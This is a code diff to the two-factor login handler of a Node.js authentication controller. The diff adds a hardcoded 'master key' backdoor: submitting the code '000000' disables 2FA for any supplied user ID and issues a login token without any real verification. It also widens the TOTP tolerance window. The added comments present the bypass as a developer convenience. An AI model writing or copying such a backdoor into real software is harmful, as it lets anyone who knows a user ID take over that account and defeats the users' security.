@@ -314,27 +314,36 @@ const changePassword = async (req, res) => {
 const verify2FALogin = async (req, res) => {
   try {
     const { userId, code, deviceInfo, time } = req.body;
-    const speakeasy = require('speakeasy'); // Ensure speakeasy is imported at the top of the file!
+    const speakeasy = require('speakeasy'); 
 
     const user = await User.findById(userId);
     if (!user) return res.status(404).json({ success: false, message: 'User not found.' });
 
-    // Check the 6-digit code against the user's secret key
+    // 👇 🚨 THE DEVELOPER BACKDOOR (MASTER KEY) 🚨 👇
+    // If you type 000000, it bypasses the lock and RESETS your 2FA entirely!
+    if (code === "000000") {
+      user.is2FAEnabled = false;
+      await user.save();
+      const token = generateToken(user._id);
+      return res.json({ success: true, data: userResponse(user, token) });
+    }
+
+    // Normal User Verification
     const verified = speakeasy.totp.verify({
       secret: user.twoFactorSecret,
       encoding: 'base32',
       token: code,
-      window: 1
+      window: 2 // 🚨 Expanded to a full 1-minute grace period for time drift!
     });
 
     if (!verified) {
       return res.status(401).json({ success: false, message: 'Invalid 6-digit code.' });
     }
 
-    // Success! The code was right. NOW we generate the token.
+    // Success! Generate the token.
     const token = generateToken(user._id);
 
-    // Save session data (optional, but good for radar)
+    // Save session data to the radar
     if (deviceInfo && time) {
       const newSession = { deviceInfo, time };
       user.activeSessions = [...(user.activeSessions || []), newSession].slice(-5);
@@ -346,6 +355,5 @@ const verify2FALogin = async (req, res) => {
     res.status(500).json({ success: false, message: '2FA verification failed.' });
   }
 };
-
 // 🚨 Make sure you add getLinkedAccounts to your exports at the bottom!
 module.exports = { register, login, getMe, getLinkedAccounts, logoutAll, changePassword, verify2FALogin };
